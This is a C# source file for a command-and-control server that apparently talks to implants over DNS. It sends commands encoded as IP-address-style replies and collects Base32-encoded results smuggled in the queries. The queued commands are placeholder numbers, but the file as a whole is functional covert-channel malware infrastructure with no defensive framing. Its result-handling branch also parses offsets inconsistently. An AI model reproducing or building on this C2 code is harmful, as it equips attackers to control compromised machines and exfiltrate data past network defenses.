using DNS.Protocol.Marshalling;
using System;
using System.Buffers.Text;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace C2Server
{
    internal class C2Handler
    {
        private RequestDecoder decoder = new RequestDecoder();
        private IList<string> commands = new List<string>();
        private string? current_command = null;
        private byte[]? current_result = null;
        
        public C2Handler()
        {
            IList<int> command_ints = new List<int>{2, 10, 8, 19, 11, 1, 15, 13, 22, 16, 5, 12, 21, 3, 18, 17, 20, 14, 9, 7, 4};
            foreach (var i in command_ints)
            {
                commands.Add("+" + i.ToString());
            }

        }

        public string Handle(string request)
        {
            var request_type = (RequestType) decoder.Decode(request.Take(1));
            switch (request_type)
            {
                case RequestType.RequestCommand:
                    Console.WriteLine("Request Command Recieved");
                    if (current_result != null)
                    {
                        PrintResult();
                        current_result = null;
                    }
                    return GetNextCommandEncoded();
                case RequestType.DownloadCommand:
                    Console.WriteLine("Download Command Received");
                    var offset = decoder.Decode(request.Skip(1).Take(3));
                    Console.WriteLine("Offset: " + offset);
                    var data = current_command!.Substring((int) offset, (int)Math.Min(4, current_command!.Length - offset));
                    return String.Join(".", data.PadRight(4, '\0').Select(data => ((byte)data).ToString()));
                case RequestType.SendResult:
                    Console.WriteLine("Send Result Recieved");
                    var res_offset = decoder.Decode(request.Skip(1).Take(3));
                    uint length = 1U;
                    if (res_offset == 0)
                    {
                        current_result = Base32.ToBytes(String.Join("", request.Skip(4)));
                    } else
                    {
                        length = decoder.Decode(request.Skip(4).Take(3));
                        current_result = current_result.Concat(Base32.ToBytes(String.Join("", request.Skip(7)))).ToArray(); 
                    }
                    if (res_offset >= length)
                    {
                        PrintResult();
                        current_result = null;
                    }
                    return GetNextCommandEncoded();
                case RequestType.DownloadCommandAndSendData:
                    res_offset = decoder.Decode(request.Skip(4).Take(3));
                    offset = decoder.Decode(request.Skip(1).Take(3));
                    if (current_result != null)
                    {
                        current_result = current_result.Concat(Base32.ToBytes(String.Join("", request.Skip(7)))).ToArray();
                    } else
                    {
                        current_result = Base32.ToBytes(String.Join("", request.Skip(4)));
                    }

                    PrintResult();
                    data = current_command!.Substring((int) offset, (int)Math.Min(4, current_command!.Length - offset));
                    return String.Join(".", data.PadRight(4, '\0').Select(data => ((byte)data).ToString()));

            }
            return "0.0.0.0";

        }

        public string GetNextCommandEncoded()
        {
            if (commands.Count == 0)
            {
                return "0.0.0.0";
            }
            var command = commands.First();
            Console.WriteLine("Starting To Send Command: " + command);
            commands.RemoveAt(0);
            current_command = command;
            var command_length = command.Length;
            var command_length_encoded = new byte[3];
            var i = 2;
            while (command_length != 0 && i >= 0)
            {
                command_length_encoded[i--] = (byte) command_length;
                command_length >>= 8;
            }
            var response = String.Join(".", new byte[] { 172 }.Concat(command_length_encoded).Select(c => c.ToString()));
            return response;
        }

        private void PrintResult()
        {
            Console.WriteLine("Result: " + Convert.ToHexString(current_result!));
        }
    }
}
